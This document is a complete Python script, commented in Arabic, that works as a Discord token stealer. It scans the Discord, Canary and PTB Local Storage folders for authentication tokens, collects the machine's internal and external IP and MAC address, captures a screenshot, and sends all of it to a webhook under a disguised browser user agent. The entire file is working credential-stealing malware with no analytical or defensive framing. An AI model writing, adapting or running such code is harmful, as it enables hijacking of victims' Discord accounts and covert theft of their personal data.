import os
import re
import json
import logging
import pyautogui
import requests
import socket
import uuid
from io import BytesIO

# إعداد سجل الأخطاء
logging.basicConfig(filename='error.log', level=logging.ERROR)

# عنوان الويب هوك
WEBHOOK_URL = 'WEBHOOK_URL'

def get_ip_and_mac():
    try:
        # الحصول على عنوان IP الداخلي
        internal_ip = socket.gethostbyname(socket.gethostname())
        
        # الحصول على عنوان IP الخارجي
        external_ip = requests.get('https://api.ipify.org').text
        
        # الحصول على عنوان MAC
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        
        return internal_ip, external_ip, mac_address
    except Exception as e:
        logging.error(f"Error getting IP and MAC addresses: {e}")
        return 'Unavailable', 'Unavailable', 'Unavailable'

def find_discord_tokens(path):
    tokens = []
    path = os.path.join(path, 'Local Storage', 'leveldb')

    if not os.path.exists(path):
        return tokens

    try:
        for file_name in os.listdir(path):
            if file_name.endswith(('.log', '.ldb')):
                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                    content = file.read()
                    tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content))
    except Exception as e:
        logging.error(f"Error finding tokens in {path}: {e}")

    return tokens

def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        return buffer
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")
        return None

def build_message():
    roaming = os.getenv('APPDATA')

    if not roaming:
        logging.error("Environment variable for APPDATA is not set.")
        return None

    paths = {
        'Discord': os.path.join(roaming, 'Discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb')
    }

    tokens = []
    for path in paths.values():
        if os.path.exists(path):
            tokens.extend(find_discord_tokens(path))

    internal_ip, external_ip, mac_address = get_ip_and_mac()

    if not tokens:
        tokens_message = 'No Discord tokens found.'
    else:
        tokens_message = '\n'.join(tokens)

    embed = {
        "title": "System Information",
        "fields": [
            {"name": "Internal IP", "value": internal_ip, "inline": True},
            {"name": "External IP", "value": external_ip, "inline": True},
            {"name": "MAC Address", "value": mac_address, "inline": True},
            {"name": "Discord Tokens", "value": f'```\n{tokens_message}\n```', "inline": False}
        ],
        "color": 0x00ff00
    }

    return embed

def send_data(embed, screenshot):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    try:
        # إرسال النصوص
        payload = json.dumps({'embeds': [embed]})
        response = requests.post(WEBHOOK_URL, data=payload, headers=headers)
        response.raise_for_status()

        # إرسال لقطة الشاشة إذا كانت متوفرة
        if screenshot:
            image_data = screenshot.getvalue()
            files = {'file': ('screenshot.png', image_data, 'image/png')}
            response = requests.post(WEBHOOK_URL, files=files)
            response.raise_for_status()
    except Exception as e:
        logging.error(f"Error sending data to webhook: {e}")

def main():
    embed = build_message()
    if embed:
        screenshot = capture_screenshot()
        send_data(embed, screenshot)

if __name__ == '__main__':
    main()

